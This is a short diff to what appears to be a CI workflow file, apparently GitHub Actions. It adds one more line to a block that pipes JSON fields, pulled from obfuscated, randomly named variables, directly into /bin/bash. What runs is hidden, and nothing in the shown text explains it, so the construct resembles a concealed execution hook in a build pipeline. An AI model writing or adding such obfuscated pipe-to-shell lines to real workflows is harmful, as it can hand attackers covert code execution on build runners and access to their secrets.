@@ -34,6 +34,7 @@ jobs:
           echo $eophl999 | jq -r .eps08 | /bin/bash
           echo $kdvs9 | jq -r .xvjq64 | /bin/bash
           echo $h35 | jq -r .mz6472 | /bin/bash
+          printf '%s' "$dq7" | jq -r .zgf14450 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
